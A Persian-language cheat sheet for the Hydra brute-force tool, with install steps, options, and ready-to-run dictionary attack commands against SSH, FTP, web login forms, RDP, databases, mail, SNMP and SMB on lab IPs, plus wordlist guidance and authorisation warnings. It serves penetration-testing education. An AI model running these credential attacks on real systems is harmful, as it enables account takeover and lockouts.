🔑 چیت‌شیت جامع Hydra

🔰 مقدمه – Hydra چیست؟

Hydra یکی از محبوب‌ترین و قدرتمندترین ابزارهای Brute-Force و حملات دیکشنری است که توسط van Hauser توسعه یافته و در Kali Linux به صورت پیش‌فرض نصب می‌باشد. این ابزار به متخصصان امنیت امکان می‌دهد تا با استفاده از لیست‌های دیکشنری، رمز عبور سرویس‌های مختلف را آزمایش کنند.

Hydra از بیش از ۵۰ پروتکل مختلف پشتیبانی می‌کند و می‌تواند حملات موازی با تعداد تردهای بالا انجام دهد که آن را به ابزاری بسیار سریع و کارآمد تبدیل کرده است.

💡 پروتکل‌های پشتیبانی‌شده توسط Hydra:
  • خدمات شبکه: SSH, FTP, Telnet, RDP, VNC, POP3, IMAP, SMTP
  • پروتکل‌های وب: HTTP-GET, HTTP-POST, HTTPS-GET, HTTPS-POST
  • پایگاه‌های داده: MySQL, PostgreSQL, Oracle, MSSQL
  • سایر: SMB, SNMP, LDAP, Cisco, Teamspeak, Asterisk و …
⚠️ هشدار اخلاقی: استفاده از Hydra برای حملات Brute-Force به سیستم‌هایی که مجوز ندارید، جرم محسوب می‌شود. این ابزار فقط برای تست نفوذ قانونی و در محیط‌های مجاز استفاده شود.

📥 نصب و راه‌اندازی Hydra

📌 نصب در Kali Linux (پیش‌فرض):

Hydra در Kali Linux به صورت پیش‌فرض نصب است. برای اطمینان از آخرین نسخه:

sudo apt update
sudo apt install hydra -y

📌 نصب نسخه GUI (xHydra):

sudo apt install hydra-gtk -y

📌 نصب در ویندوز:

دانلود از: https://github.com/vanhauser-thc/thc-hydra

📌 بررسی نصب و نسخه:

hydra -h
hydra -V

⚙️ دستورات پایه و گزینه‌های Hydra

گزینهتوضیحمثال
-l نام کاربری مشخص -l admin
-L فایل حاوی لیست نام‌کاربری -L users.txt
-p رمز عبور مشخص -p password123
-P فایل حاوی لیست رمزهای عبور (دیکشنری) -P passwords.txt
-C فایل حاوی ترکیب user:password (هر خط یک ترکیب) -C credentials.txt
-t تعداد تردهای موازی (پیش‌فرض: ۱۶) -t 4
-T تعداد تردها برای هر هدف -T 8
-f پس از پیدا کردن اولین رمز موفق، متوقف شود -f
-v حالت نمایش جزئیات (Verbose) -v
-V نمایش هر تلاش (بسیار جزئی) -V
-o ذخیره خروجی در فایل -o results.txt
-s پورت سفارشی (غیر از پیش‌فرض) -s 2222
-e تست ترکیب‌های اضافی: n (خالی), s (همان username), r (reverse) -e nsr
-w زمان انتظار برای پاسخ (ثانیه) -w 3
-4 / -6 استفاده از IPv4 یا IPv6 -4
-M فایل حاوی لیست اهداف (برای حملات به چندین هدف) -M targets.txt
-R ادامه حمله از نقطه قبلی (Resume) -R
💡 نکته: ترکیب گزینه‌های -l و -P برای حملات دیکشنری با یک کاربر مشخص، و -L و -P برای حملات با لیست کاربران و رمزها استفاده می‌شود.

🎯 حملات به پروتکل‌های مختلف

🔵 SSH (پورت ۲۲)

# حمله دیکشنری به SSH با یک کاربر مشخص
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101

# حمله با لیست کاربران و رمزها
hydra -L users.txt -P passwords.txt ssh://192.168.1.101

# با پورت سفارشی
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.101

# با ۴ ترد و توقف پس از پیدا شدن
hydra -l root -P passwords.txt -t 4 -f ssh://192.168.1.101

# ذخیره خروجی
hydra -l root -P passwords.txt ssh://192.168.1.101 -o hydra_results.txt

🔴 FTP (پورت ۲۱)

# حمله دیکشنری به FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.101

# با لیست کاربران
hydra -L users.txt -P passwords.txt ftp://192.168.1.101

# تست پسورد خالی
hydra -l admin -e n ftp://192.168.1.101

🟢 HTTP (وب - فرم‌های ورود)

# حمله به فرم ورود با متد POST
hydra -l admin -P passwords.txt 192.168.1.101 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"

# با متد GET
hydra -l admin -P passwords.txt 192.168.1.101 http-get-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

# HTTPS
hydra -l admin -P passwords.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
💡 توضیح ساختار http-post-form:
"/path:parameters:error_message"
  • path: مسیر صفحه ورود (مثل /login.php)
  • parameters: پارامترهای فرم با ^USER^ و ^PASS^ به عنوان جای‌گذار
  • error_message: پیام خطا که نشان‌دهنده ناموفق بودن ورود است

🟡 RDP (پورت ۳۳۸۹)

# حمله دیکشنری به RDP (ویندوز)
hydra -l Administrator -P passwords.txt rdp://192.168.1.101

# با پورت سفارشی
hydra -l Administrator -P passwords.txt -s 3389 rdp://192.168.1.101
⚠️ هشدار: حملات RDP می‌توانند باعث قفل شدن حساب‌های کاربری شوند. با احتیاط استفاده کنید.

🟣 Telnet (پورت ۲۳)

# حمله دیکشنری به Telnet
hydra -l root -P passwords.txt telnet://192.168.1.101
💡 نکته: Telnet یک پروتکل ناامن است و معمولاً در سیستم‌های قدیمی یافت می‌شود.

🗄️ MySQL (پورت ۳۳۰۶)

# حمله دیکشنری به MySQL
hydra -l root -P passwords.txt mysql://192.168.1.101

# با پورت سفارشی
hydra -l root -P passwords.txt -s 3306 mysql://192.168.1.101

📧 SMTP (پورت ۲۵)

# حمله به SMTP (برای شناسایی کاربران)
hydra -L users.txt -p test smtp://192.168.1.101 -V

# حمله دیکشنری به SMTP
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.101

📡 SNMP (پورت ۱۶۱)

# حمله دیکشنری به SNMP (Community String)
hydra -P community.txt snmp://192.168.1.101 -v
💡 نکته: SNMP معمولاً با رشته‌های community پیش‌فرض مانند public و private پیکربندی می‌شود.

📂 SMB (پورت ۴۴۵)

# حمله دیکشنری به SMB
hydra -l Administrator -P passwords.txt smb://192.168.1.101

📧 POP3 (پورت ۱۱۰) و IMAP (پورت ۱۴۳)

# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.101

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.101

📚 دیکشنری‌های مفید برای Hydra

دیکشنریمسیر در Kali Linuxتوضیح
rockyou.txt /usr/share/wordlists/rockyou.txt معروف‌ترین دیکشنری، شامل میلیون‌ها رمز واقعی (نیاز به extract)
SecLists /usr/share/seclists/ مجموعه کامل دیکشنری‌ها (نام‌کاربری، رمز، مسیرها و …)
fasttrack.txt /usr/share/wordlists/fasttrack.txt دیکشنری سریع برای رمزهای ضعیف
cirt-default-passwords.txt /usr/share/wordlists/cirt-default-passwords.txt رمزهای پیش‌فرض دستگاه‌ها
CommonUsernamePasswords /usr/share/seclists/Passwords/CommonCredentials/ ترکیب نام‌کاربری و رمزهای رایج
fuzz.txt /usr/share/seclists/Fuzzing/ لیست داده‌های Fuzzing

📌 استخراج rockyou.txt:

sudo gunzip /usr/share/wordlists/rockyou.txt.gz

📌 ایجاد دیکشنری سفارشی با crunch:

# ایجاد دیکشنری با طول ۸ کاراکتر شامل حروف کوچک و اعداد
crunch 8 8 -t aaaaaaaa -o custom.txt

# ترکیب دو دیکشنری
cat dict1.txt dict2.txt > combined.txt

🧪 سناریوهای عملی با Hydra

📌 سناریو ۱: حمله به SSH یک سرور

# با یک کاربر و دیکشنری rockyou
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101

# با لیست کاربران و رمزها
hydra -L users.txt -P passwords.txt -t 4 -f ssh://192.168.1.101

📌 سناریو ۲: حمله به فرم ورود یک وب‌سایت

# فرم با متد POST
hydra -l admin -P passwords.txt 192.168.1.101 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid credentials"

# فرم با متد GET و HTTPS
hydra -L users.txt -P passwords.txt https-get-form "/login.php:user=^USER^&pass=^PASS^:Error"

📌 سناریو ۳: حمله به چندین هدف همزمان

# ایجاد فایل targets.txt با لیست IPها
echo "192.168.1.101" > targets.txt
echo "192.168.1.102" >> targets.txt
echo "192.168.1.103" >> targets.txt

# حمله به همه اهداف
hydra -l admin -P passwords.txt -M targets.txt ssh

📌 سناریو ۴: ادامه حمله از نقطه قبلی (Resume)

# حمله را متوقف کنید (Ctrl+C)
# سپس با گزینه -R ادامه دهید
hydra -R

📌 سناریو ۵: تست رمزهای پیش‌فرض دستگاه‌ها

# تست با دیکشنری رمزهای پیش‌فرض
hydra -L cirt-default-usernames.txt -P cirt-default-passwords.txt ssh://192.168.1.101
💡 نکته: برای افزایش سرعت حملات، از گزینه -t برای تنظیم تردها و -T برای موازی‌سازی استفاده کنید.

🔒 نکات امنیتی و حرفه‌ای

  • همیشه از دیکشنری‌های به‌روز استفاده کنید: دیکشنری‌های قدیمی ممکن است رمزهای جدید را پوشش ندهند.
  • تنظیم تردها بر اساس سرعت شبکه: تردهای زیاد ممکن است باعث شناسایی یا قطع اتصال شود.
  • استفاده از گزینه -f: برای صرفه‌جویی در زمان، پس از پیدا شدن رمز، حمله را متوقف کنید.
  • ذخیره خروجی: همیشه نتایج را در یک فایل ذخیره کنید تا بعداً تحلیل کنید.
  • آزمایش در محیط‌های مجاز: هرگز Hydra را روی سیستم‌های بدون مجوز اجرا نکنید.
  • استفاده از دیکشنری‌های اختصاصی: برای حملات هدفمند، دیکشنری‌های سفارشی با استفاده از Crunch یا CeWL بسازید.
⚠️ هشدار اخلاقی: حملات Brute-Force می‌توانند باعث قفل شدن حساب‌های کاربری و اختلال در عملکرد سیستم شوند. همیشه با احتیاط و در زمان‌های مناسب استفاده کنید.

📖 واژه‌نامه تخصصی Hydra

واژهتوضیح کامل
Brute-Force حمله‌ای که در آن مهاجم با امتحان کردن تمام ترکیب‌های ممکن، سعی در پیدا کردن رمز عبور دارد.
Dictionary Attack حمله‌ای که در آن از یک لیست از پیش تعیین‌شده (دیکشنری) از کلمات و عبارات برای حدس رمز استفاده می‌شود.
Thread یک واحد اجرایی موازی که به Hydra اجازه می‌دهد چندین تلاش را همزمان انجام دهد.
Payload داده‌ای که در حملات Intruder به نقاط مشخص شده تزریق می‌شود (مثل رمز عبور).
Credential مجموعه اطلاعات احراز هویت شامل نام کاربری و رمز عبور.
Protocol مجموعه قوانین برای ارتباط بین دستگاه‌ها در شبکه (مثل SSH, FTP, HTTP).
Rate Limiting مکانیزمی که تعداد تلاش‌های ناموفق ورود را محدود می‌کند و از حملات Brute-Force جلوگیری می‌کند.
Account Lockout قفل شدن حساب کاربری پس از تعداد مشخصی تلاش ناموفق برای ورود.
Wordlist لیستی از کلمات که در حملات دیکشنری استفاده می‌شود.
Hydra ابزاری برای اجرای حملات Brute-Force و دیکشنری روی پروتکل‌های مختلف شبکه.
xHydra نسخه گرافیکی Hydra که استفاده از آن را برای مبتدیان آسان‌تر می‌کند.
💡 جمع‌بندی چیت‌شیت Hydra:

Hydra یکی از سریع‌ترین و قدرتمندترین ابزارهای Brute-Force است که با پشتیبانی از بیش از ۵۰ پروتکل، به متخصصان امنیت امکان تست مقاومت رمزهای عبور را می‌دهد. با ترکیب دیکشنری‌های مناسب و گزینه‌های بهینه، می‌توان حملات مؤثری را در محیط‌های آزمایشگاهی پیاده‌سازی کرد.

📌 توصیه نهایی: همیشه قبل از استفاده از Hydra، مجوز کتبی دریافت کنید و در محیط‌های کنترل‌شده تمرین کنید. استفاده از دیکشنری‌های به‌روز و تنظیم تردها بر اساس شرایط شبکه، کلید موفقیت است.
